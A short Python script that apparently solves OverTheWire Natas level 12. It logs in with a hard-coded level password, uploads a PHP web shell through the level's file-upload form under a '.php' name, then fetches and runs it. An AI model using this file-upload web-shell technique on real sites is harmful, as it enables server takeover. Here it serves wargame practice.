import base64, requests, re

auth = base64.b64encode(b"natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3").decode('utf-8')
res = requests.post("http://natas12.natas.labs.overthewire.org/", headers = {"Authorization": "Basic " + auth}, data = {"filename": "lolcopter.php"}, files = {"uploadedfile": open("./shell.php", "r")}).content.decode('utf-8')
uploadedFile = re.findall(r"href=\"(.*\.php)\"", res)[0]
res = requests.get("http://natas12.natas.labs.overthewire.org/" + uploadedFile, headers = {"Authorization": "Basic " + auth}).content.decode('utf-8')
print(res, end = "")